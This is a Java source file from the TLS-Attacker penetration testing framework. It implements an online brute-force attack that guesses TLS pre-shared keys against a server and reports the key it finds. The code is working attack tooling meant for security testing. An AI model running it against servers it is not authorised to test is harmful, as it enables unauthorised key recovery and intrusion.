/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.bruteforce.GuessProvider;
import de.rub.nds.tlsattacker.attacks.bruteforce.GuessProviderFactory;
import de.rub.nds.tlsattacker.attacks.config.PskBruteForcerAttackServerCommandConfig;
import static de.rub.nds.tlsattacker.attacks.impl.Attacker.LOGGER;
import de.rub.nds.tlsattacker.core.util.LogLevel;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.CipherSuite;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import java.util.concurrent.TimeUnit;

public class PskBruteForcerAttackServer extends Attacker<PskBruteForcerAttackServerCommandConfig> {

    private GuessProvider guessProvider;

    public PskBruteForcerAttackServer(PskBruteForcerAttackServerCommandConfig config) {
        super(config);
    }

    @Override
    public void executeAttack() {
        LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Connecting to the Server to find a PSK ciphersuite he supports...");
        CipherSuite suite = getSupportedPskCiphersuite();
        if (suite == null) {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Stopping attack");
        }
        LOGGER.log(
                LogLevel.CONSOLE_OUTPUT,
                "The server supports "
                        + suite
                        + ". Trying to guess the PSK. This is an online Attack. Depending on the PSK this may take some time...");
        guessProvider = GuessProviderFactory.createGuessProvider(config.getGuessProviderType(),
                config.getGuessProviderInputStream());
        boolean result = false;
        int counter = 0;
        long startTime = System.currentTimeMillis();
        while (!result) {
            byte[] guessedPsk = guessProvider.getGuess();
            if (guessedPsk == null) {
                LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Could not find psk - attack stopped");
                break;
            }
            if (guessedPsk.length == 0) {
                continue;
            }
            counter++;
            if (LOGGER.isDebugEnabled()) {
                LOGGER.debug("Guessing: " + ArrayConverter.bytesToHexString(guessedPsk));
            }
            result = executeProtocolFlowToServer(suite, guessedPsk);
            if (result) {
                long stopStime = System.currentTimeMillis();
                LOGGER.log(
                        LogLevel.CONSOLE_OUTPUT,
                        "Found the psk in "
                                + String.format(
                                        "%d min, %d sec",
                                        TimeUnit.MILLISECONDS.toMinutes(stopStime - startTime),
                                        TimeUnit.MILLISECONDS.toSeconds(stopStime - startTime)
                                                - TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(stopStime
                                                        - startTime))));
                LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Guessed " + counter + " times");
            }
        }
    }

    @Override
    public Boolean isVulnerable() {
        LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Connecting to the Server...");
        boolean supportsPsk = getSupportedPskCiphersuite() != null;
        if (supportsPsk) {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Maybe vulnerable - server supports PSK");
            return null;
        } else {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Not Vulnerable - server does not support PSK");
            return false;
        }
    }

    private CipherSuite getSupportedPskCiphersuite() {
        Config tlsConfig = config.createConfig();

        String clientIdentity = config.getPskIdentity();
        LOGGER.debug("Client Identity: " + clientIdentity);
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
                RunningModeType.CLIENT);
        State state = new State(tlsConfig, trace);
        WorkflowExecutor executor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(),
                state);
        executor.executeWorkflow();
        if (WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, trace)) {
            return state.getTlsContext().getSelectedCipherSuite();
        } else {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT,
                    "Did not receive a ServerHello. The Server does not seem to support any of the tested PSK cipher suites.");
            LOGGER.debug("We tested for the following cipher suites:");
            for (CipherSuite suite : tlsConfig.getDefaultClientSupportedCiphersuites()) {
                LOGGER.debug(suite.name());
            }
            return null;
        }
    }

    private boolean executeProtocolFlowToServer(CipherSuite suite, byte[] pskGuess) {
        Config tlsConfig = config.createConfig();
        tlsConfig.setDefaultClientSupportedCiphersuites(suite);
        tlsConfig.setDefaultSelectedCipherSuite(suite);
        tlsConfig.setDefaultPSKKey(pskGuess);
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(
                WorkflowTraceType.HANDSHAKE, RunningModeType.CLIENT);
        State state = new State(tlsConfig, trace);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();
        if (state.getWorkflowTrace().executedAsPlanned()) {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "PSK " + ArrayConverter.bytesToHexString(pskGuess));
            return true;
        } else {
            return false;
        }
    }
}
